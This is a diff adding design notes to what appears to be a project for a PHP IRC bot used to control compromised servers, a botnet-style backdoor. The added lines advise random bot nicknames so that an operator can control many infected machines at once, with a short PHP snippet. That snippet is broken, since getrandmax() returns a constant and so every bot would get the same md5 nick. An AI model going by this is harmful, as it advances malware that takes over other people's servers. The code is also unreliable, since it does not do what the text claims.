@@ -11,3 +11,11 @@ it possible to control the compromised machine even if some of the code is remov
 
 Most parts of the IRCBot will work on either windows or Linux, I will just have to adapt the command part to 
 the specific OS on the given server.
+
+When choosing a name for the PHP IRC Bot, use a random name (very random name) , because 
+you will have several servers running the code and if two servers choose the same name when joining
+then you won't be able to control both of them.
+Perhaps this is a good way to eliminate the problem.
+<- $randomNum = getrandmax();
+<- $nick = md5($randomNum);
+
